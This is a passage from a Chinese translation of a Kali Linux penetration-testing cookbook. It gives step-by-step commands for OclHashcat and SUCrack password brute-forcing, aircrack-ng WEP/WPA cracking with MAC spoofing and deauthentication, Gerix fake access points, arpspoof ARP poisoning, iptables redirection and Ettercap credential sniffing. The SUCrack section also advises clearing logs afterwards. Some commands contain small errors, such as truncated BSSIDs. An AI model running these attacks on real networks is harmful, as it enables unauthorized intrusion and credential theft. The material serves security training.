让我们开始使用 OclHashcat-plus。

1.  打开终端窗口并将目录改为  OclHashcat-plus 所在目录。

    ```
    cd /usr/share/oclhashcat-plus
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-9-1.jpg)
    
2.  执行下列命令来启动  OclHashcat-plus 的帮助文件：

    ```
    ./oclHashcat-plus.bin –help 
    ```
    
3.  运行 OclHashcat 的语法是`oclHashcat-plus.bin [options] hash [mask]`。

    > 使用  OclHashcat 的重点之一是理解它的字符集结构。
    
4.  在我们开始攻击之前，让我们先看看一些可用的攻击向量。OclHashcat 在攻击中使用左右掩码。密码的字符按照掩码划分，并且被均分为左和右掩码。对于每个掩码，你可以为其指定字典或字符集。出于我们的目的，我们会使用定制的字符集。

5.  为了指定自定义字符集，我们使用`–1`选项。我们可以设置任意多的自定义字符集，只要为它们指定一个数值（`1-n`）。每个自定义字符都由问号（`?`）来表示，并且随后是字符类型。可用的选择是：

    +   `d`指定数字（0~9）
    +   `l`指定小写字母
    +   `u`指定大写字母
    +   `s`指定特殊字符
    +   `1-n`指定用做占位符的自定义字符集。
    
6.  这样将它们组合起来，我们就指定了一个自定义字符集，它包括特殊字符（`s`），大写字母（`u`），小写字母（`l`）和数字（`d`），生成长度为 8 的密码。我们打算指定叫做`attackfile`的哈希表。

    ```
    ./oclHashcat-plus.bin attackfile -1 ?l?u?d?s ?1?1?1?1 ?1?1?1?1
    ```
    
7.  我们可以将这个命令这样拆分：

    +   ` ./oclHashcat-plus.bin `调用了 OclHashcat 。
    
    +   `attackfile`是我们的攻击文件。
    
    +   `-1 ?l?u?d?`指定了自定义字符集`1`，它包含小写字母、大写字母、数字和特殊字符。
    
    +   `?1?1?1?1`是使用字符集`1`的左掩码。
    
    +   `?1?1?1?1`是使用字符集`1`的右掩码。
    
    这就结束了。
    
## 8.10 物理访问攻击

这个秘籍中，我们会使用 SUCrack 来执行物理访问密码攻击。 SUCrack 是个多线程的工具，能够通过`su`来执行本地用户账户的暴力破解。Linux 的`su`命令允许你作为替代用户来运行命令。这个攻击，虽然在你不能通过其他手段提权 Linux 系统时非常有用，但是会填满日志文件，所以请确保在完成之后清理这些日志。

SUCrack 拥有几种备选的可用命令：

+   `--help`允许你查看它的帮助文档。

+   `-l`允许你修改我们尝试绕过登录的用户。

+   `-s`允许你设置展示统计信息的秒数间隔。默认值为 3 秒。

+   `-a`允许你设置是否使用 ANSI 转义代码。

+   `-w`允许你设置工作线程的数量。由于 SUCrack 是多线程的，你可以运行任意多的线程。我们推荐你只使用一个线程，因为每次失败的登录尝试在尝试下个密码之前通常有三秒的延迟。

### 操作步骤

1.  为了使用 SUCrack，你需要在启动时指定单词列表。否则，你会得到一条搞笑的信息。打开终端窗口并执行`sucrack`命令。出于我们的目的，我们会使用之前创建的自定义单词列表文件，它由 Crunch 生成。但是，你可以指定任何希望的单词列表。

    ```
    sucrack /usr/share/wordlists/rockyou.txt
    ```
    
2.  如果你打算设置两个工作线程，以及每 6 秒显示一次统计信息，并且使用 ANSI 转义代码，你可以使用下列命令：

    ```
    sucrack –w 2 –s 6 –a /usr/share/wordlists/rockyou.txt 
    ```
    
    这就结束了。
    
### 工作原理

这个秘籍中，我们使用 SUCrack 来对系统的 root 用户执行物理访问密码攻击。使用单词列表的攻击可以对管理员（默认）或特定用户指定。我们运行`sucrack`命令，它为我们执行攻击。


# 第九章：无线攻击

> 作者：Willie L. Pritchett, David De Smet

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

## 简介

当今，无线网络随处可见。由于用户四处奔走，插入以太网网线来获取互联网访问的方式非常不方便。无线网络为了使用便利要付出一些代价；它并不像以太网连接那样安全。这一章中，我们会探索多种方式来操纵无线网络流量，这包括移动电话和无线网络。

### 9.1 WEP 无线网络破解

WEP（无线等效协议）于 1999 年诞生，并且是用于无线网络的最古老的安全标准。在 2003 年，WEP 被 WPA 以及之后被 WPA2 取代。由于可以使用更加安全的协议，WEP 加密很少使用了。实际上，推荐你永远不要使用 WEP 加密来保护你的网络。有许多已知的方式来攻击 WEP 加密，并且我们在这个秘籍中会探索这些方式之一。

这个秘籍中，我们会使用 AirCrack 套件来破解 WEP 密码。 AirCrack 套件（或 AirCrack NG）是 WEP 和 WPA 密码破解程序，它会抓取无线网络封包，分析它们，使用这些数据来破解 WEP 密码。

### 准备

为了执行这个秘籍中的任务，需要 Kali 终端窗口的经验。也需要受支持的配置好的无线网卡，用于封包注入。在无线网卡的例子中，封包注入涉及到发送封包，或将它注入到双方已经建立的连接中。请确保你的无线网卡允许封包注入，因为并不是所有无线网卡都支持它。

### 操作步骤

让我们开始使用 AirCrack 来破解 WEP 加密的网络会话。

1.  打开终端窗口，并产生无线网络接口的列表：

    ```
    airmon-ng
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-1-1.jpg)
    
2.  在`interface`列下，选择你的接口之一。这里，我们使用`wlan0`。如果你的接口不同，例如`mon0`，请将每个提到`wlan0`的地方都换成它。

3.  下面，我们需要停止`wlan0`接口，并把它关闭，便于我们接下来修改 MAC 地址。

    ```
    airmon-ng stop 
    ifconfig wlan0 down
    ```
    
4.  下面，我们需要修改我们接口的 MAC 地址。由于机器的 MAC 地址会在任何网络上标识你的存在，修改机器的标识允许我们隐藏真正的 MAC 地址。这里，我们使用`00:11:22:33:44:55`。

    ```
    macchanger --mac 00:11:22:33:44:55 wlan0 
    ```
    
5.  现在我们需要重启` airmon-ng`。

    ```
    airmon-ng start wlan0
    ```
    
6.  下面，我们会使用` airodump`来定位附近的可用无线网络。

    ```
    airodump-ng wlan0 
    ```
    
7.  这会出现可用无线网络的列表。一旦你找到了你想要攻击的网络，按下`Ctrl + C`来停止搜索。选中`BSSID`列中的 MAC 地址，右击你的鼠标，并且选择复制。同时，把网络正在发送哪个频道的信号记录下载。你会在`Channel`列中找到这个信息。这里，这个频道是`10`。

8.  现在运行`airodump`，并且将所选`BSSID`的信息复制到文件中。我们会使用下列选项：

    +   `-c`允许我们选择频道。这里我们选择`10`。
    
    +   `-w`允许我们选择文件名称。这里我们选择`wirelessattack`。
    
    +   `-bssid`允许我们选择我们的`BSSID`。这里，我们从剪贴板上粘贴`09:AC:90:AB:78`。
    
    ```
    airodump-ng –c 10 –w wirelessattack --bssid 09:AC:90:AB:78 wlan0 
    ```
    
9.  新的窗口会打开，并展示这个命令的输出。保持这个窗口开着。

0.  打开另一个终端窗口，为了尝试组合它们，我们运行`aireplay`。它拥有下列语法：`aireplay-ng -1 0 –a [BSSID] –h [our chosen MAC address] –e [ESSID] [Interface]`。

    ```
    aireplay-ng -1 0 -a 09:AC:90:AB:78 –h 00:11:22:33:44:55 –e backtrack wlan0
    ```
    
1.  下面，我们发送一些流量给路由器，便于捕获一些数据。我们再次使用`aireplay`，以下列格式：` aireplay-ng -3 –b [BSSID] – h [Our chosen MAC address] [Interface]`。

    ```
    aireplay-ng -3 –b 09:AC:90:AB:78 –h 00:11:22:33:44:55 wlan0
    ```
    
2.  你的屏幕会开始被流量填满。将它运行一到两分钟，直到你拥有了用来执行破解的信息。

3.  最后我们运行 AirCrack 来破解 WEP 密码。

    ```
    aircrack-ng –b 09:AC:90:AB:78 wirelessattack.cap 
    ```
    
    这就结束了。
    
### 工作原理

在这个秘籍中，我们使用了 AirCrack 套件来破解无线网络的 WEP 密码。AirCrack 是最流行的 WEP 破解工具之一。AirCrack 通过收集 WEP 无线连接的封包来工作，之后它会通过算术分析数据来破解 WEP 加密密码。我们通过启动 AirCrack 并选择我们想要的接口来开始。下面，我们修改了 MAC 地址，这允许我们修改互联网上的身份，之后使用`airodump`搜索可用的无线网络来攻击。一旦我们找到了打算攻击的网络，我们使用`aireplay`来将我们的机器与正在攻击的无线设备的 MAC 地址关联。我们最后收集到了一些流量，之后暴力破解生成的 CAP 文件来获得无线密码。

## 5.2 WPA/WPA2 无线网络破解

WPA（无线保护访问）于 2003 年诞生，并且为保护无线网络和取代过时的旧标准 WEP 而创建。WEP 被 WPA 以及之后的 WPA2 代替。由于存在更加安全的协议，WEP 很少使用了。

这个秘籍中，我们会使用 AirCrack 套件来破解 WPA 密码。 AirCrack 套件（或 AirCrack NG）是 WEP 和 WPA 密码破解程序，它抓取网络封包，分析它们，并使用这些数据破解 WPA 密码。

### 准备

为了执行这个秘籍中的任务，需要 Kali 终端窗口的经验。也需要受支持的配置好的无线网卡，用于封包注入。在无线网卡的例子中，封包注入涉及到发送封包，或将它注入到双方已经建立的连接中。

### 操作步骤

让我们开始使用 AirCrack 来破解 WEP 加密的网络会话。

1.  打开终端窗口，并产生无线网络接口的列表：

    ```
    airmon-ng
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-2-1.jpg)
    
2.  在`interface`列下，选择你的接口之一。这里，我们使用`wlan0`。如果你的接口不同，例如`mon0`，请将每个提到`wlan0`的地方都换成它。

3.  下面，我们需要停止`wlan0`接口，并把它关闭，便于我们接下来修改 MAC 地址。

    ```
    airmon-ng stop 
    ifconfig wlan0 down
    ```
    
4.  下面，我们需要修改我们接口的 MAC 地址。由于机器的 MAC 地址会在任何网络上标识你的存在，修改机器的标识允许我们隐藏真正的 MAC 地址。这里，我们使用`00:11:22:33:44:55`。

    ```
    macchanger --mac 00:11:22:33:44:55 wlan0 
    ```
    
5.  现在我们需要重启` airmon-ng`。

    ```
    airmon-ng start wlan0
    ```
    
6.  下面，我们会使用` airodump`来定位附近的可用无线网络。

    ```
    airodump-ng wlan0 
    ```
    
7.  这会出现可用无线网络的列表。一旦你找到了你想要攻击的网络，按下`Ctrl + C`来停止搜索。选中`BSSID`列中的 MAC 地址，右击你的鼠标，并且选择复制。同时，把网络正在发送哪个频道的信号记录下载。你会在`Channel`列中找到这个信息。这里，这个频道是`10`。

8.  现在运行`airodump`，并且将所选`BSSID`的信息复制到文件中。我们会使用下列选项：

    +   `-c`允许我们选择频道。这里我们选择`10`。
    
    +   `-w`允许我们选择文件名称。这里我们选择`wirelessattack`。
    
    +   `-bssid`允许我们选择我们的`BSSID`。这里，我们从剪贴板上粘贴`09:AC:90:AB:78`。
    
    ```
    airodump-ng –c 10 –w wirelessattack --bssid 09:AC:90:AB:78 wlan0 
    ```
    
9.  新的窗口会打开，并展示这个命令的输出。保持这个窗口开着。

0.  打开另一个终端窗口，为了尝试组合它们，我们运行`aireplay`。它拥有下列语法：`aireplay-ng -1 0 –a [BSSID] –h [our chosen MAC address] –e [ESSID] [Interface]`。

    ```
    Aireplay-ng --deauth 1 –a 09:AC:90:AB:78 –c 00:11:22:33:44:55 wlan0 
    ```
    
1.  最后我们运行 AirCrack 来破解 WEP 密码。`-w`选项允许我们指定单词列表的位置。我们使用事先命名的`.cap`文件。这里，文件名称是`wirelessattack.cap`。

    ```
    Aircrack-ng –w ./wordlist.lst wirelessattack.cap
    ```
    
    这就结束了。

### 工作原理

在这个秘籍中，我们使用了 AirCrack 套件来破解无线网络的 WPA 密码。AirCrack 是最流行的 WPA 破解工具之一。AirCrack 通过收集 WPA 无线连接的封包来工作，之后它会通过算术分析数据来破解 WPA 加密密码。我们通过启动 AirCrack 并选择我们想要的接口来开始。下面，我们修改了 MAC 地址，这允许我们修改互联网上的身份，之后使用`airodump`搜索可用的无线网络来攻击。一旦我们找到了打算攻击的网络，我们使用`aireplay`来将我们的机器与正在攻击的无线设备的 MAC 地址关联。我们最后收集到了一些流量，之后暴力破解生成的 CAP 文件来获得无线密码。

## 9.3 无线网络自动化破解

这个秘籍中我们会使用 Gerix 将无线网络攻击自动化。Gerix 是 AirCrack 的自动化 GUI。Gerix 默认安装在 Kali Linux 中，并且能够加速我们的无线网络破解过程。

### 准备

为了执行这个秘籍中的任务，需要 Kali 终端窗口的经验。也需要受支持的配置好的无线网卡，用于封包注入。在无线网卡的例子中，封包注入涉及到发送封包，或将它注入到双方已经建立的连接中。

### 操作步骤

让我们开始使用 Gerix 进行自动化的无线网络破解。首先下载它：

1.  使用`wget`，访问下面的网站并下载 Gerix：

    ```
    wget https://bitbucket.org/Skin36/gerix-wifi-cracker-pyqt4/ downloads/gerix-wifi-cracker-master.rar
    ```
    
2.  文件下载好之后，我们需要从 RAR 文件中解压数据。

    ```
    unrar x gerix-wifi-cracker-master.ra
    ```
    
3.  现在，为了保持文件一致，让我们将 Gerix 文件夹移动到` /usr/share `目录下，和其它渗透测试工具放到一起。

    ```
    mv gerix-wifi-cracker-master /usr/share/gerix-wifi-cracker
    ```

4.  让我们访问 Gerix 所在的目录：

    ```
    cd /usr/share/gerix-wifi-cracker
    ```
    
5.  我们键入下列命令来启动 Gerix：

    ```
    python gerix.py
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-3-1.jpg)
    
6.  点击`Configuration`（配置）标签页。

7.  在`Configuration`标签页中，选择你的无线接口。

8.  点击`Enable/Disable Monitor Mode `（开启/停止监控器模式）按钮。

9.  在监控模式启动之后，在` Select Target Network`（选择目标网络）下面，点击` Rescan Networks `（重新扫描网络）按钮。

0.  目标网络的列表会填满。选择无线网络作为目标。这里，我们选择了 WEP 加密的网络。

1.  点击 WEP 标签页。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-3-2.jpg)

2.  在` Functionalities`（功能）中，点击` Start Sniffing and Logging `（开启嗅探和记录）按钮。

3.  点击 `WEP Attacks (No Client)`（WEP 攻击 无客户端）子标签页。

4.  点击` Start false access point authentication on victim `（开启目标上的伪造接入点验证）按钮。

5.  点击`Start the ChopChop attack`（开始断续攻击）按钮。

6.  在打开的终端窗口中，对`Use this packet `（使用这个封包）问题回答`Y`。

7.  完成之后，复制生成的`.cap`文件。

8.  点击` Create the ARP packet to be injected on the victim access  point`（创建注入到目标接入点的 ARP 封包）按钮。

9.  点击`Inject the created packet on victim access point`（将创建的封包注入到目标接入点）按钮。

0.  在打开的终端窗口中，对`Use this packet `问题回答`Y`。

1.  收集了大约 20000 个封包之后，点击`Cracking`（破解）标签页。

2.  点击`Aircrack-ng – Decrypt WEP Password`（解密 WEP 密码）按钮。

    这就结束了。
    
### 工作原理

这个秘籍中，我们使用了 Gerix 来自动化破解无线网络，为获得 WEP 密码。我们以启动 Gerix 并开启监控模式接口来开始这个秘籍。下面，我们从由 Gerix 提供的攻击目标的列表中选择我们的目标。在我们开始嗅探网络流量之后，我们使用  Chop Chop 来生成 CAP 文件。我们最后以收集 20000 个封包并使用 AirCrack 暴力破解 CAP 文件来结束这个秘籍。

使用 Gerix，我们能够自动化破解 WEP 密码的步骤，而不需要手动在终端窗口中键入命令。这是一种非常棒的方式，能够快速高效地破解 WEP 加密的网络。

## 9.4 使用伪造接入点连接客户端

这个秘籍中，我们会使用 Gerix 来创建并设置伪造接入点（AP）。建立伪造接入点让我们能够收集每个连接它的计算机的信息。人们通常会为了便利而牺牲安全。连接到开放无线接入点并发送简短的电子邮件，或登录到社交网络中非常方便。Gerix 是 AirCrack 的自动化 GUI。

### 准备

为了执行这个秘籍中的任务，需要 Kali 终端窗口的经验。也需要受支持的配置好的无线网卡，用于封包注入。在无线网卡的例子中，封包注入涉及到发送封包，或将它注入到双方已经建立的连接中。


### 操作步骤

让我们开始使用 Gerix 创建伪造的 AP。

1.  让我们访问 Gerix 所在的目录：

    ```
    cd /usr/share/gerix-wifi-cracker
    ```
    
2.  键入下面的命令来使用 Gerix：

    ```
    python gerix.py
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-4-1.jpg)
    
3.  点击` Configuration`（配置）标签页。

4.  在`Configuration`标签页中，选择你的无线接口。

5.  点击`Enable/Disable Monitor Mode`（开启/停止监控器模式）按钮。

6.  在监控模式启动之后，在` Select Target Network`（选择目标网络）下面，点击` Rescan Networks `（重新扫描网络）按钮。

7.  目标网络的列表会填满。选择无线网络作为目标。这里，我们选择了 WEP 加密的网络。

8.  点击`Fake AP`（伪造接入点）标签页。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-4-2.jpg)
    
9.  修改` Access Point ESSID`（接入点 ESSID），将其从`honeypot`修改为不会引起怀疑的名称。这里我们使用` personalnetwork`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-4-3.jpg)
    
0.  其它选项使用默认。为了开启伪造接入点，点击` Start Face Access Point`（开启伪造接入点）按钮。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-4-4.jpg)
    
    这就结束了。
    
### 工作原理

这个秘籍中，我们使用了 Gerix 来创建伪造接入点。创建伪造接入点是一个非常好的方式，来收集没有防备用户的信息。原因是，对于受害者来说，它们表现为正常的接入点，所欲会使它被用户信任。使用 Gerix，我们可以只通过几次点击来自动化创建和设置伪造接入点。

## 9.5 URL 流量操纵

这个秘籍中，我们会进行 URL 流量操纵攻击。URL 流量操纵非常类似于中间人攻击，因为我们会让去往互联网的流量首先通过我们的机器。我们使用 ARP 毒化来执行这个攻击。ARP 毒化是一种技巧，让我们能够在局域网中发送欺骗性的 ARP 信息给受害者。我们会使用 arpspoof 来执行这个秘籍。

### 操作步骤

让我们开始进行 URL 流量操纵。

1.  打开终端窗口并执行下面的命令，来配置 IP 表使我们能够劫持流量：

    ```
    sudo echo 1 >> /proc/sys/net/ipv4/ip_forward
    ```
    
2.  下面，我们启动 arpspoof 来毒化从受害者主机到默认网关的流量。这个例子中，我们在局域网中使用 Windows 7 主机，地址为` 192.168.10.115`。Arpspoof 有一些选项，包括：

    +   `-i`允许我们选择目标接口。这里我们选择`wlan0`。
    +   `-t`允许我们指定目标。
    
    > 整个命令的语法是`arpspoof –i [interface] –t [target IP address] [destination IP address]`。
    
    ```
    sudo arpspoof –i wlan0 -t 192.168.10.115 192.168.10.1
    ```
    
3.  接着，我们执行另一个 arpspoof 命令，它会从上一个命令的目的地（这里是默认网关）取回流量，并使流量经过我们的 Kali 主机。这个例子中，我们的 IP 地址是` 192.168.10.110`。

    ```
    sudo arpspoof –i wlan0 -t 192.168.10.1 192.168.10.110 
    ```
    
    这就结束了。
    
### 工作原理

这个秘籍中，我们使用 arpspoof 通过 ARP 毒化来操纵受害者主机到路由器之间的流量，使其通过我们的 Kali 主机。一旦流量被重定向，我们就可以对受害者执行其它攻击，包括记录键盘操作，跟踪浏览的网站，以及更多。

## 9.6 端口重定向

这个秘籍中，我们使用 Kali 来进行端口重定向，也叫做端口转发或端口映射。端口重定向涉及到接收发往某个端口，比如 80 的数据包，并把它重定向到不同的端口上，比如 8080。执行这类攻击的好处很多，因为你可以将安全的端口重定向为非安全的端口，或者将流量重定向到特定的设备的特定端口，以及其它。

### 操作步骤


让我们开始进行端口重定向/转发。

1.  打开终端窗口并执行下列命令来配置 IP 表，使我们能够劫持流量：

    ```
    Sudo echo 1 >> /proc/sys/net/ipv4/ip_forward
    ```
    
2.  下面，我们启动 arpspoof 来毒化去往默认网关的流量。这个例子中，默认网关的 IP 地址为 ` 192.168.10.1`。Arpspoof 有一些选项，包括：

    +   `-i`允许我们选择目标接口。这里我们选择`wlan0`。
    
    > 整个命令的语法是`arpspoof –i [interface] [destination IP address]`。
    
    ```
    sudo arpspoof –i wlan0 192.168.10.1
    ```
    
3.  接着，我们执行另一个 arpspoof 命令，它会从上一个命令的目的地（这里是默认网关）取回流量，并使流量经过我们的 Kali 主机。这个例子中，我们的 IP 地址是` 192.168.10.110`。

    ```
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    ```
    
    这就结束了。
    
### 工作原理

这个秘籍中，我们使用 arpspoof 通过 ARP 毒化和 IPTables 路由，将网络上发到端口 80 的流量重定向到 8080。执行这类攻击的好处很多，因为你可以将安全的端口重定向为非安全的端口，或者将流量重定向到特定的设备的特定端口，以及其它。

## 9.7 嗅探网络流量

这个秘籍中，我们会实验网络流量的嗅探。网络流量嗅探涉及到拦截网络封包，分析它们，之后将流量解码（如果需要）来展示封包中的信息。流量嗅探特别在目标的信息收集中非常有用，因为取决于所浏览的网站，你可以看见所浏览的网址、用户名、密码和其它可以利用的信息。

我们在这个秘籍中会使用 Ettercap ，但是你也可以使用 Wireshark。处于展示目的，Ettercap 更加易于理解以及应用嗅探原理。一旦建立起对嗅探过程的理解，你可以使用 Wireshark 来进行更详细的分析。

### 准备

这个秘籍需要为封包注入配置好的无线网卡，虽然你可以在有线网络上执行相同步骤。在无线网卡的情况下，封包注入涉及到将封包发送或注入到双方已经建立的连接中。

### 操作步骤

让我们启动 Ettercap 来开始网络流量的嗅探。

1.  打开终端窗口并启动 Ettercap。使用`-G`选项加载 GUI：

    ```
    ettercap –G
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-1.jpg)
    
2.  我们以打开` Unified sniffing`（统一嗅探）开始。你可以按下`Shift + U`或者访问菜单中的` Sniff | Unified sniffing`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-2.jpg)

3.  选择网络接口。在发起 MITM 攻击的情况中，我们应该选项我们的无线接口。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-3.jpg)
    
4.  下面，我们打开`Scan for hosts`（扫描主机）。可以通过按下`Ctrl + S`或访问菜单栏的` Hosts | Scan for hosts`来完成。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-4.jpg)

5.  下面，我们得到了`Host List`（主机列表）。你可以按下`H`或者访问菜单栏的`Hosts | Host List`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-5.jpg)
    
6.  我们下面需要选择或设置我们的目标。在我们的例子中，我们选择`192.168.10.111`作为我们的`Target 1`，通过选中它的 IP 地址并按下` Add To Target 1 `（添加到目标 1）按钮。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-6.jpg)
    
7.  现在我们能够让 Ettercap 开始嗅探了。你可以按下`Ctrl + W`或访问菜单栏的` Start | Start sniffing`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-7.jpg)

8.  最后，我们开始进行 ARP 毒化。访问菜单栏的`Mitm | Arp poisoning`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-8.jpg)

9.  在出现的窗口中，选中` Sniff  remote connections`（嗅探远程连接）的选项。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-9.jpg)

0.  取决于网络环境，我们会看到信息。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-10.jpg)

1.  一旦我们找到了想要找的信息（用户名和密码）。我们可以关闭 Ettercap。你可以按下`Ctrl + E`或访问菜单栏的`Start | Stop sniffing`来完成它。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-11.jpg)

2.  现在我们关闭 ARP 毒化，使网络恢复正常。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/9-7-12.jpg)

### 工作原理

这个秘籍包括了 MITM 攻击，它通过 ARP 毒化来窃听由用户发送的无线网络通信。我们以启动 Ettercap 并扫描主机来开始这个秘籍。之后我们开始进行网络的 ARP 毒化。ARP 毒化是一种技巧，允许你发送伪造的 ARP 信息给局域网内的受害者。

我们以启动封包嗅探并停止 ARP 毒化让网络恢复正常来结束。这个步骤在侦测过程中很关键，因为在你停止毒化网络时，它让网络不会崩溃。

这个过程对于信息收集很有用，因为它能收集到网络上传输的信息。取决于网络环境，你可以收集到用户名、密码、银行账户详情，以及其它你的目标在网络上发送的信息。这些信息也可以用于更大型攻击的跳板。
